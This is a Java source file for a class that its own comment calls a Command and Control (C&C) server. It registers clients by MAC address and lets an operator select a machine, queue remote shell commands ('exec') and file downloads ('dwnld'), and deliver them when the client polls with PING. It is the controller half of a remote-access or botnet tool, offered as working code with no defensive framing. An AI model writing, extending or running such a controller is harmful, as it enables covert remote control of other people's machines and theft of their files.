package server;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Socket;
import java.util.HashMap;

import tools.Command;
import tools.Log;
import tools.ParsedCommand;

/**
 * Represents a Command and Control (C&C) server
 * 
 * @author Yohan Chalier
 *
 */
public class CommandServer implements RequestHandler, CommandHandler {
	
	// The string sent when no matching command is found
	public static final String ERROR_COMMAND_NOT_FOUND = "Command not found.";
	
	// The sets of commands for both the server and the client
	private final HashMap<String, Command> cmdsServer;
	private final HashMap<String, Command> cmdsClient;
	
	// The set of connected clients IPs
	private ClientPool clients;
	private int currentClient = -1;
	
	// Log requests
	private Log log;
	
	public CommandServer() {
		log = new Log();
		
		clients = new ClientPool();
		
		cmdsServer = new HashMap<String, Command>();
		cmdsClient = new HashMap<String, Command>();
		
		// Display available commands
		cmdsServer.put("help", new Command(){
			
			@Override
			public String exec(String[] args) {
				StringBuilder builder = new StringBuilder();
				
				for (String key: cmdsServer.keySet())
					builder.append(key + '\n');
				
				// Removing last '\n'
				builder.setCharAt(builder.length() - 1, (char) 0);
				
				return builder.toString();
			}
			
		});
		
		// Close user input
		cmdsServer.put("exit", new Command(){
			
			@Override
			public String exec(String[] args) {
				return null;
			}
			
		});
		
		// List all connected clients
		cmdsServer.put("list", new Command(){
			
			@Override
			public String exec(String[] args) {
				
				StringBuilder sb = new StringBuilder();
				sb.append("id     MAC address\n");
				
				for (int id: clients.keySet()) {
					sb.append(id + "   "
							+ clients.get(id).getMACAddress() + "\n");
				}
				
				// Removing last '\n'
				sb.setCharAt(sb.length() - 1, (char) 0);
				
				return sb.toString();
			}
			
		});
		
		// Select a client to 'exec' commands
		cmdsServer.put("select", new Command(){
			
			@Override
			public String exec(String[] args) {
				currentClient = Integer.parseInt(args[0]);
				return "Selected client " + args[0];
			}
			
		});
		
		// Execute a command
		cmdsServer.put("exec", new Command(){
			
			@Override
			public String exec(String[] args) {
				if (currentClient >= 0) {
					ConnectedClient client;
					if ((client = identify(currentClient)) != null) {
						StringBuilder cmd = new StringBuilder();
						cmd.append("EXEC ");
						for (int i = 0; i < args.length; i++){
							cmd.append(args[i]
									+ (i == args.length - 1 ? "" : " "));
						}
						client.stackCmd(cmd.toString());
						return "Added command to stack";
					}
					return "No corresponding client (" + args[0] + ") found.";
				} else {
					return "Select a client first.";
				}
			}
			
		});
		
		// Download a file
		cmdsServer.put("dwnld", new Command(){
			
			@Override
			public String exec(String[] args) {
				if (currentClient >= 0) {
					ConnectedClient client;
					if ((client = identify(currentClient)) != null) {
						StringBuilder cmd = new StringBuilder();
						cmd.append("DWNLD ");
						for (int i = 0; i < args.length; i++){
							cmd.append(args[i]
									+ (i == args.length - 1 ? "" : " "));
						}
						client.stackCmd(cmd.toString());
						return "Added command to stack";
					}
					return "No corresponding client (" + args[0] + ") found.";
				} else {
					return "Select a client first.";
				}
			}
			
		});
		
		// Show log
		cmdsServer.put("log", new Command(){
			
			@Override
			public String exec(String[] args) {
				if (args.length > 0)
					return log.getText(Integer.parseInt(args[0]));
				return log.getText();
			}
			
		});
		
		// Assign an ID to a client
		cmdsClient.put("GETID", new Command(){
			
			@Override
			public String exec(String[] args) {

				ConnectedClient client = clients.findByMac(args[0]);
				
				if (client != null) { // Already known client
					return Integer.toString(client.getId());
				} else { // New client
					return Integer.toString(clients.addClient(args[0]));
				}
				
			}
			
		});
		
		// Answer a ping
		cmdsClient.put("PING", new Command(){
			
			@Override
			public String exec(String[] args) {
				ConnectedClient client;
				if ((client = identify(args[0])) != null && client.hasCmd()) {
					return client.popCmd();
				}
				return "PONG";
			}
			
		});
		
		// ADD COMMANDS HERE
		
	}
	
	private ConnectedClient identify(String idStr) {
		return identify(Integer.parseInt(idStr));
	}
	
	private ConnectedClient identify(int id) {
		if (clients.containsKey(id)) {
			return clients.get(id);
		}
		return null;
	}

	@Override
	public String getResponse(Socket socket)
			throws IOException {
		
		// TODO: Identify client
		// InetAddress client = socket.getInetAddress();
		
		// Reading request
		BufferedReader reader = new BufferedReader(
    			new InputStreamReader(socket.getInputStream()));
		
		StringBuilder builder = new StringBuilder();
		
		// Reading POST header
		String line;
		int contentLength = 0;
		final String contentHeader = "Content-Length: ";
		while (!(line = reader.readLine()).equals("")) {
			if (line.startsWith(contentHeader)) {
				contentLength = Integer.parseInt(
						line.substring(contentHeader.length()));
			}
 		}
		
		// Reading POST body
		int c = 0;
		for (int i = 0; i < contentLength; i++){
			c = reader.read();
			builder.append((char) c);
		}
		String request = builder.toString();
				
		// TODO log
		if (request.startsWith("EXEC_OUT"))
			System.out.println(request);
		else
			log.add("REQUEST   " + socket.getInetAddress() + "   " + request);
		
		// Executing command
		ParsedCommand pCmd = new ParsedCommand(request);
		if (cmdsClient.containsKey(pCmd.cmd))
			return cmdsClient.get(pCmd.cmd).exec(pCmd.args);
		return ERROR_COMMAND_NOT_FOUND;
	}

	@Override
	public String executeCommand(String cmd) {
		ParsedCommand pCmd = new ParsedCommand(cmd);
		if (cmdsServer.containsKey(pCmd.cmd))
			return cmdsServer.get(pCmd.cmd).exec(pCmd.args);
		return ERROR_COMMAND_NOT_FOUND;
	}

	@Override
	public String getPrefix() {
		if (currentClient >= 0) return Integer.toString(currentClient);
		return "";
	}
	
}
